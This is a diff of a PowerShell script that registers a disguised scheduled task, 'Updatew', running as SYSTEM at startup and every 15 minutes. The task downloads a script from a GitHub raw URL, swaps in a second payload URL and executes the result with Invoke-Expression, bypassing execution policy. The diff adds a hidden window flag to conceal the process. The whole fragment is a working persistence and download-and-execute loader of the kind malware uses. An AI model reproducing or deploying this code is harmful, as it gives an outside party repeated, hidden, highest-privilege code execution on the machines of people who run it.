@@ -8,7 +8,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Start-Sleep -Seconds 8
 }
 
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"& { $ProgressPreference = 'SilentlyContinue'; $t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t.Content -replace 'dropfileurl', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | Invoke-Expression }`""
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& { $ProgressPreference = 'SilentlyContinue'; $t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t.Content -replace 'dropfileurl', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | Invoke-Expression }`""
 $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 Register-ScheduledTask -TaskName "Updatew" -Action $action -Trigger $trigger -Principal $principal
